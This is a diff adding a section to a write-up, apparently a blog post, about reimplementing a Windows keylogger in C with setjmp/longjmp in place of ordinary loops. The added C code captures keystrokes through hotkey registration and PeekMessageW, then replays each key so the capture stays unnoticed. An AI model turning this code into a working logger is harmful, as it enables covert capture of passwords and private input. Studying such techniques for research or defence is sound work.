@@ -30,6 +30,8 @@ Well, loop #1 is easy, since I can just implement it in the most procedural way:
 ...
 ```
 
+Note that I map each virtual key to its own ID, which should make things easier later as I do not need to maintain a complex table that maps between those.
+
 Loop #2 is more challenging. In my original code I run the keylogger for a certain amount of time, but I think it's okay for me to just run forever.  
 So, what I'm after is implementing this:
 ```c
@@ -53,5 +55,27 @@ jmp_buf tJumpBuffer = { 0 };
 // Loop logic goes here
 
 longjmp(tJumpBuffer, 1);
+```
+
+## Conditions
+For conditions I needed to check only a couple of things:
+1. The return result of the [PeekMessageW](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-peekmessagew) API - it's a `BOOL` but essentially will be either `0` or `1`.
+2. Validating that the message type is `WM_HOTKEY`.
+
+Both of those are comparisons to known values, with an `and` logic between them. Essentially what I want to do is:
+
+```c
+if ((PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE)) && (WM_HOTKEY == tMsg.message))
+{
+	cCurrVk = (BYTE)((((DWORD)tMsg.lParam) & 0xFFFF0000) >> 16);
+	(VOID)wprintf(L"%c", cCurrVk);
+	(VOID)UnregisterHotKey(NULL, cCurrVk);
+	keybd_event(cCurrVk, 0, 0, (ULONG_PTR)NULL);
+	(VOID)RegisterHotKey(NULL, cCurrVk, 0, cCurrVk);
+}
+else
+{
+	Sleep(20);
 }
 ```
+
